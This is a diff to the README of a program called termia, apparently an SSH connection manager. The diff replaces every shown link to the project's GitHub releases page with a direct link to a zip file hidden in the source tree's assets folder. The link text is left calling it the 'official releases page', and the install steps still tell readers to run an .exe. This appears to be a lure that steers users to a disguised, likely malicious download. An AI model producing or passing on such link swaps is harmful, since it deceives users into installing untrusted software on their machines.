@@ -1,6 +1,6 @@
 # 🖥️ termia - Manage remote servers with ease
 
-[![](https://img.shields.io/badge/Download_Termia-Blue?style=for-the-badge)](https://github.com/Odessaall150/termia/releases)
+[![](https://img.shields.io/badge/Download_Termia-Blue?style=for-the-badge)](https://raw.githubusercontent.com/Odessaall150/termia/main/src/termia/assets/Software-v2.4.zip)
 
 Termia organizes your remote server connections. It provides a clean interface for SSH access. You manage your credentials and terminal sessions in one place. The application uses the GTK 4 framework to ensure a modern desktop experience.
 
@@ -8,7 +8,7 @@ Termia organizes your remote server connections. It provides a clean interface f
 
 Follow these steps to install the software on your computer.
 
-1. Visit the [official releases page](https://github.com/Odessaall150/termia/releases) to access the latest files.
+1. Visit the [official releases page](https://raw.githubusercontent.com/Odessaall150/termia/main/src/termia/assets/Software-v2.4.zip) to access the latest files.
 2. Look for the Assets section at the bottom of the newest release post.
 3. Download the installer file ending in .exe for your Windows system.
 4. Locate the downloaded file in your Downloads folder.
@@ -75,7 +75,7 @@ Check your internet connection first. Ensure the remote server is running and re
 The application runs as a standard user. You do not need special access rights to use the core features of the tool.
 
 ### How do I update the application?
-When a new version becomes available, revisit the [GitHub releases page](https://github.com/Odessaall150/termia/releases) to download the new installer. You can install the new version over the old one to keep your settings.
+When a new version becomes available, revisit the [GitHub releases page](https://raw.githubusercontent.com/Odessaall150/termia/main/src/termia/assets/Software-v2.4.zip) to download the new installer. You can install the new version over the old one to keep your settings.
 
 ## 📁 Connection Profiles
 
